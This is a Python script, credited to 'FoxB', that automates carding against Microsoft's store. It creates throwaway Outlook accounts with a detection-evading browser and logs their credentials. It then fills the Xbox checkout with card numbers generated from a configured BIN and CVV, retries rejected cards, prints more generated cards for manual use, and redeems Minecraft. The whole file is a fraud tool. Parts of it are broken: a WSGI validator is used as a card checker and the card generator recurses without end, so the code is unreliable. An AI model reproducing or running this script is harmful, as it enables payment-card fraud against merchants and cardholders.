import sys
from wsgiref import validate   
import undetected_chromedriver.v2 as uc              
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait                
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.keys import Keys
from colorama import init
from termcolor import cprint
from colorama import Fore
import datetime
import random
import string
import time
import json

def main():
    config = json.load(open('config.json'))
    country = config['country']
    gplink = config['gplink']
    carding = config['carding']
    bin = carding['bin']
    cvv = carding['cvv']
    postalcode = config['postalcode']
    expiry = carding['expiry']
    month = expiry['month']
    year = expiry['year']

    init(strip=not sys.stdout.isatty())
    print(f'{Fore.GREEN} By FoxB, unpatched')

    
    email = random_string(10, string.ascii_lowercase) + '@outlook.com'
    password = random_string(8, string.ascii_letters)

    print(f'{Fore.GREEN}----------------------------------')
    print(f'{Fore.GREEN}Email: ' + email)
    print(f'{Fore.GREEN}Password: ' + password)
    print(f'{Fore.GREEN}----------------------------------')
    print('\n')

    options = uc.ChromeOptions()
    webdriver = uc.Chrome(options = options)
    wait = WebDriverWait(webdriver, 60)
    webdriver.get('https://signup.live.com/')

    print('[!] Starting sign up process.')

    wait.until(EC.visibility_of_element_located((By.ID, 'MemberName'))).send_keys(email)
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()
    
    wait.until(EC.visibility_of_element_located((By.ID, 'PasswordInput'))).send_keys(password)
    wait.until(EC.visibility_of_element_located((By.ID, 'iOptinEmail'))).click()
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()

    wait.until(EC.visibility_of_element_located((By.ID, 'FirstName'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'LastName'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()

    wait.until(EC.visibility_of_element_located((By.ID, 'Country'))).send_keys(country)
    Select(webdriver.find_element(By.ID, 'BirthMonth')).select_by_value(str(random.randint(1, 12)))
    Select(webdriver.find_element(By.ID, 'BirthDay')).select_by_value(str(random.randint(1, 28)))
    wait.until(EC.visibility_of_element_located((By.ID, 'BirthYear'))).send_keys('1988')
    wait.until(EC.visibility_of_element_located((By.ID, 'iSignupAction'))).click()

    WebDriverWait(webdriver, 20000).until(EC.visibility_of_element_located((By.ID, 'idSIButton9')))

    print('[!] Finished signup, redirecting to buy page.')

    now = datetime.datetime.now()
    with open("alt_log_" + now.strftime('%Y-%m-%d') + '.txt', "a") as f:
        f.write(email + ':' + password + '\n')

    webdriver.get(gplink)
    wait.until(EC.visibility_of_element_located((By.ID, 'mectrl_main_trigger'))).click()

    wait.until(EC.visibility_of_element_located((By.ID, 'Accept'))).click()

    print('[!] Created Xbox account.')

    wait.until(EC.visibility_of_element_located((By.XPATH, '//a[@class=\"c-call-to-action c-glyph xbstorebuy xbstoreDynAdd storeDynAdded\"]'))).click()
    wait.until(EC.visibility_of_element_located((By.XPATH, '//button[@class=\"ContextualStoreProductDetailsPage-module__width100___1ZKcJ ContextualStoreProductDetailsPage-module__marginTop1___1QM1B ContextualStoreProductDetailsPage-module__actionButton___iWgTQ Button-module__defaultBase___2r-eQ Button-module__heroMediumBorderRadius___3-DXM Button-module__buttonBase___1vCmd Button-module__typeBrand___1AMyM Button-module__sizeMedium___2Wg1O Button-module__overlayModeSolid___Nv0Hx\"]'))).click()


    print('[!] Starting carding process.')

    webdriver.switch_to.frame('purchase-sdk-hosted-iframe')
    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="store-cart-root"]/div/div/div[2]/div/div[2]/button[2]'))).click()
    wait.until(EC.visibility_of_element_located((By.ID, 'id_credit_card_visa_amex_mc'))).click()

    number = gen_cc(bin)
    while not validate(number):
        number = gen_cc(bin)
    print('Trying card: ' + number + '|' + month + '|20' + year + '|' + cvv)

    wait.until(EC.visibility_of_element_located((By.ID, 'accountToken'))).send_keys(number)
    wait.until(EC.visibility_of_element_located((By.ID, 'accountHolderName'))).send_keys('a')
    wait.until(EC.visibility_of_element_located((By.ID, 'input_expiryMonth'))).send_keys(month)
    wait.until(EC.visibility_of_element_located((By.ID, 'input_expiryYear'))).send_keys(year)
    wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).send_keys(cvv)
    wait.until(EC.visibility_of_element_located((By.ID, 'address_line1'))).send_keys('Street 1')
    wait.until(EC.visibility_of_element_located((By.ID, 'city'))).send_keys('New York')
    wait.until(EC.visibility_of_element_located((By.ID, 'postal_code'))).send_keys(postalcode)
    wait.until(EC.visibility_of_element_located((By.ID, 'pidlddc-button-saveButton'))).click()

    for i in range(10):
        if wait.until(EC.visibility_of_element_located((By.ID, 'pidlddc-error-cvvToken'))):
            wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).send_keys(Keys.CONTROL, 'a')
            time.sleep(2)
            wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).send_keys(Keys.BACKSPACE)
            time.sleep(2)
            wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).send_keys(cvv)
            time.sleep(2)
            wait.until(EC.visibility_of_element_located((By.ID, 'pidlddc-button-saveButton'))).click()
            print(i)
    else:
        pass

    for i in range(10):
        if wait.until(EC.visibility_of_element_located((By.ID, 'pidlddc-error-cvvToken'))):
            wait.until(EC.visibility_of_element_located((By.ID, 'accountToken'))).send_keys(Keys.CONTROL, 'a')
            time.sleep(2)
            wait.until(EC.visibility_of_element_located((By.ID, 'accountToken'))).send_keys(Keys.BACKSPACE)
            time.sleep(2)
            wait.until(EC.visibility_of_element_located((By.ID, 'accountToken'))).send_keys(number)
            wait.until(EC.visibility_of_element_located((By.ID, 'pidlddc-button-saveButton'))).click()
            print(i)
    else:
        pass
    
    try:
        wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="store-cart-root"]/div/div/div[2]/div/div[2]/button[2]'))).click()
    except Exception:
        print("Failed, try carding manually")
        
        print("Here are some generated cards.")
        for i in range(10):
            number = gen_cc(bin)
            while not validate(number):
                number = gen_cc(bin)
            print(number + '|' + month + '|20' + year + '|' + cvv)
    
    webdriver.switch_to.default_content()

    WebDriverWait(webdriver, 20000).until(EC.visibility_of_element_located((By.ID, 'mask:120:0')))
    
    print('[!] Redirecting to Minecraft to redeem game.')

    webdriver.get('https://www.minecraft.net/en-us/msaprofile/redeem?setupProfile=true')
    
    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="CoreAppsApp"]/div/div[2]/div/div/div/div[1]/div[1]/div/a'))).click()
    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="main-content"]/div[2]/div/div[2]/div[2]/form/div/div[2]/button'))).click()
    
    print('[!] Redeemed Minecraft and ready to log in!')
    #wait.until(EC.visibility_of_element_located((By.ID, 'cvvToken'))).send_keys(cvv)
    print('[!] Closing chrome in 5 seconds.')
    time.sleep(5)

def gen_cc(bin):
    number = bin
    while('x' in number):
        number = number.replace('x', str(random.randint(0, 9)), 1)
    if not validate(number):
        return gen_cc(bin)
    return number
def random_string(length, character_set):
    return ''.join(random.choice(character_set) for i in range(length))
